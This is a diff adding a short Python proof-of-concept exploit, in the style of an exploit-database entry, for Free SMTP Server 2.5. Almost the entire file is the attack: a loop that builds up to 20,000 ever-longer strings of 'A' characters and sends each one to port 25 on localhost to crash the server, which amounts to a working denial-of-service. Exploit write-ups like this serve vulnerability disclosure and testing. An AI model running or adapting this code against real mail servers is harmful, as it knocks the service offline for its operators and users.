@@ -1,0 +1,24 @@
+#Exploit Title: Free SMTP Server - Local Denial of Service Crash (PoC)
+# Date: February 3, 2009
+# Exploit Author: Metin Kandemir (kandemir)
+# Vendor Homepage: http://www.softstack.com/freesmtp.html
+# Software Link: https://free-smtp-server.en.uptodown.com/windows/download
+# Version: 2.5
+# Tested on: Windows 7 Service Pack 1 x64
+# Software Description : Free SMTP server program to send emails directly from PC.
+# ==================================================================
+# The SMTP Server will crash when this code is run on localhost. 
+
+import socket
+
+a=1
+buffer = ["A"]
+while a <= 20000:
+        a = a+1
+        buffer.append("A"*a)
+
+
+for string in buffer:
+        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+        connect =  s.connect(('127.0.0.1',25))
+        s.send(string)
